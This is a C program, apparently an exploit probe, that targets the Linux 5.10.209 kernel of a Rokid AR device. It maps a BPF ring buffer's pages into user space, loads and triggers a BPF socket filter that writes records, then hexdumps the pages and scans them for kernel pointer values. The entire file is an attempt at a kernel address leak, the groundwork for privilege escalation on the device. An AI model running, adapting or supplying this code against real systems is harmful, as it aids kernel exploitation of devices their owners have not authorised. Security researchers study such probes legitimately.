/*
 * BPF Ringbuf Kernel Pointer Leak
 * Target: Kernel 5.10.209 Rokid AR
 *
 * Strategy:
 * 1. Create ringbuf and mmap consumer/data pages
 * 2. Use BPF to reserve, write, and submit
 * 3. Read submitted data from user-space
 * 4. Look for kernel pointers in ringbuf metadata
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/bpf.h>

/* ============== BPF Macros ============== */
#define BPF_ALU64_IMM(OP, DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_OP(OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_MOV64_REG(DST, SRC) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})
#define BPF_MOV64_IMM(DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_LD_MAP_FD(DST, FD)                                                                                 \
    ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM, .dst_reg = DST, .src_reg = 1, .off = 0, .imm = FD}), \
        ((struct bpf_insn){.code = 0, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})
#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
    ((struct bpf_insn){.code = BPF_JMP | BPF_OP(OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})
#define BPF_STX_MEM(SZ, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_STX | BPF_SIZE(SZ) | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
#define BPF_LDX_MEM(SZ, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_LDX | BPF_SIZE(SZ) | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){.code = CODE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = IMM})
#define BPF_EXIT_INSN() \
    ((struct bpf_insn){.code = BPF_JMP | BPF_EXIT})

#define BPF_SIZE(code) ((code) & 0x18)
#define BPF_FUNC_ringbuf_reserve 131
#define BPF_FUNC_ringbuf_submit 132
#define BPF_FUNC_ringbuf_output 134

static char log_buf[65536];

int bpf_syscall(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

int create_ringbuf(int max_entries)
{
    union bpf_attr attr = {0};
    attr.map_type = BPF_MAP_TYPE_RINGBUF;
    attr.max_entries = max_entries;
    return bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
}

int load_bpf_prog(struct bpf_insn *insns, int insn_cnt, const char *name)
{
    memset(log_buf, 0, sizeof(log_buf));
    union bpf_attr attr = {0};
    attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr.insns = (unsigned long)insns;
    attr.insn_cnt = insn_cnt;
    attr.license = (unsigned long)"GPL";
    attr.log_buf = (unsigned long)log_buf;
    attr.log_size = sizeof(log_buf);
    attr.log_level = 1;

    int fd = bpf_syscall(BPF_PROG_LOAD, &attr, sizeof(attr));
    if (fd < 0)
    {
        printf("[%s] FAILED (errno=%d)\n", name, errno);
        if (strlen(log_buf) > 0)
        {
            printf("Verifier: %.200s\n", log_buf);
        }
    }
    else
    {
        printf("[%s] SUCCESS (fd=%d)\n", name, fd);
    }
    return fd;
}

void trigger_bpf_prog(int prog_fd)
{
    int socks[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) < 0)
    {
        perror("socketpair");
        return;
    }

    /* Make socket non-blocking to avoid hang */
    int flags = fcntl(socks[0], F_GETFL, 0);
    fcntl(socks[0], F_SETFL, flags | O_NONBLOCK);
    fcntl(socks[1], F_SETFL, flags | O_NONBLOCK);

    if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) < 0)
    {
        perror("setsockopt");
        close(socks[0]);
        close(socks[1]);
        return;
    }
    printf("  Attached OK\n");

    char buf[64] = "trigger";
    ssize_t n = write(socks[1], buf, sizeof(buf));
    printf("  Write: %zd\n", n);

    n = read(socks[0], buf, sizeof(buf));
    printf("  Read: %zd\n", n);

    close(socks[0]);
    close(socks[1]);
}

void hexdump(const char *desc, void *addr, int len)
{
    unsigned char *p = (unsigned char *)addr;
    printf("%s (%d bytes):\n", desc, len);
    for (int i = 0; i < len; i += 16)
    {
        printf("  %04x: ", i);
        for (int j = 0; j < 16 && i + j < len; j++)
        {
            printf("%02x ", p[i + j]);
        }
        printf(" ");
        for (int j = 0; j < 16 && i + j < len; j++)
        {
            unsigned char c = p[i + j];
            printf("%c", (c >= 32 && c < 127) ? c : '.');
        }
        printf("\n");
    }
}

void scan_for_kernel_ptrs(void *buf, int len)
{
    unsigned long *p = (unsigned long *)buf;
    int count = len / sizeof(unsigned long);

    printf("Scanning for kernel pointers (0xffffff80xxxxxxxx):\n");
    for (int i = 0; i < count; i++)
    {
        if ((p[i] & 0xffffff8000000000UL) == 0xffffff8000000000UL)
        {
            printf("  [%d] KERNEL PTR: 0x%016lx\n", i, p[i]);
        }
    }
}

int main(void)
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    printf("===========================================\n");
    printf("BPF Ringbuf Kernel Pointer Leak\n");
    printf("===========================================\n\n");

    /* Create ringbuf - size must be power of 2 */
    int rb_size = 4096;
    int rb_fd = create_ringbuf(rb_size);
    if (rb_fd < 0)
    {
        printf("Failed to create ringbuf: %d\n", errno);
        return 1;
    }
    printf("Ringbuf created: fd=%d size=%d\n", rb_fd, rb_size);

    /* mmap consumer page (offset 0) */
    void *consumer_page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, rb_fd, 0);
    if (consumer_page == MAP_FAILED)
    {
        printf("Failed to mmap consumer page: %d\n", errno);
        close(rb_fd);
        return 1;
    }
    printf("Consumer page mapped: %p\n", consumer_page);

    /* mmap producer page (offset 4096) */
    void *producer_page = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rb_fd, 4096);
    if (producer_page == MAP_FAILED)
    {
        printf("Failed to mmap producer page: %d\n", errno);
        munmap(consumer_page, 4096);
        close(rb_fd);
        return 1;
    }
    printf("Producer page mapped: %p\n", producer_page);

    /* mmap data pages (offset 8192+) */
    void *data_page = mmap(NULL, rb_size, PROT_READ, MAP_SHARED, rb_fd, 8192);
    if (data_page == MAP_FAILED)
    {
        printf("Failed to mmap data page: %d\n", errno);
        munmap(producer_page, 4096);
        munmap(consumer_page, 4096);
        close(rb_fd);
        return 1;
    }
    printf("Data page mapped: %p\n", data_page);

    /* Dump initial state */
    printf("\n=== Initial Ringbuf State ===\n");
    hexdump("Consumer page", consumer_page, 64);
    hexdump("Producer page", producer_page, 64);
    hexdump("Data page", data_page, 64);

    scan_for_kernel_ptrs(consumer_page, 64);
    scan_for_kernel_ptrs(producer_page, 64);
    scan_for_kernel_ptrs(data_page, 64);

    /* Create BPF program to write to ringbuf */
    /*
     * 0-1: r1 = rb_fd (2 insns for LD_MAP_FD)
     * 2:   r2 = 32 (reserve size)
     * 3:   r3 = 0 (flags)
     * 4:   call ringbuf_reserve
     * 5:   if r0 == 0 goto +8 (exit) -> insn 14
     * 6:   r7 = r0 (save ptr)
     * 7:   r8 = 0xCAFEBABE
     * 8:   *(u64*)(r7+0) = r8
     * 9:   r8 = 0xDEADBEEF
     * 10:  *(u64*)(r7+8) = r8
     * 11:  r1 = r7
     * 12:  r2 = 0
     * 13:  call ringbuf_submit
     * 14:  r0 = 0
     * 15:  exit
     */
    struct bpf_insn prog[] = {
        BPF_LD_MAP_FD(BPF_REG_1, rb_fd),                                     /* 0-1 */
        BPF_MOV64_IMM(BPF_REG_2, 32),                                        /* 2 */
        BPF_MOV64_IMM(BPF_REG_3, 0),                                         /* 3 */
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve), /* 4 */

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 9), /* 5: skip 9 insns if null */

        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),          /* 6 */
        BPF_MOV64_IMM(BPF_REG_8, 0xCAFEBABE),         /* 7 */
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), /* 8 */
        BPF_MOV64_IMM(BPF_REG_8, 0xDEADBEEF),         /* 9 */
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 8), /* 10 */

        BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),                                /* 11 */
        BPF_MOV64_IMM(BPF_REG_2, 0),                                        /* 12 */
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_submit), /* 13 */

        BPF_MOV64_IMM(BPF_REG_0, 0), /* 14 */
        BPF_EXIT_INSN(),             /* 15 */
    };

    printf("\n=== Loading BPF Program ===\n");
    int prog_fd = load_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]), "RingbufLeak");

    if (prog_fd < 0)
    {
        munmap(data_page, rb_size);
        munmap(producer_page, 4096);
        munmap(consumer_page, 4096);
        close(rb_fd);
        return 1;
    }

    /* Trigger the program */
    printf("\n=== Triggering BPF Program ===\n");
    trigger_bpf_prog(prog_fd);
    printf("Program triggered\n");

    /* Check consumer position */
    unsigned long *cons_pos = (unsigned long *)consumer_page;
    unsigned long *prod_pos = (unsigned long *)producer_page;

    printf("\n=== After Trigger State ===\n");
    printf("Consumer position: 0x%lx\n", *cons_pos);
    printf("Producer position: 0x%lx\n", *prod_pos);

    hexdump("Consumer page after", consumer_page, 64);
    hexdump("Data page after", data_page, 128);

    scan_for_kernel_ptrs(consumer_page, 64);
    scan_for_kernel_ptrs(producer_page, 64);
    scan_for_kernel_ptrs(data_page, 128);

    /* Trigger multiple times to see if data accumulates */
    printf("\n=== Triggering 5 More Times ===\n");
    for (int i = 0; i < 5; i++)
    {
        trigger_bpf_prog(prog_fd);
    }

    printf("Consumer position: 0x%lx\n", *cons_pos);
    hexdump("Data page after 5x", data_page, 256);

    /* Cleanup */
    close(prog_fd);
    munmap(data_page, rb_size);
    munmap(producer_page, 4096);
    munmap(consumer_page, 4096);
    close(rb_fd);

    printf("\n===========================================\n");
    printf("Test Complete\n");
    printf("===========================================\n");

    return 0;
}
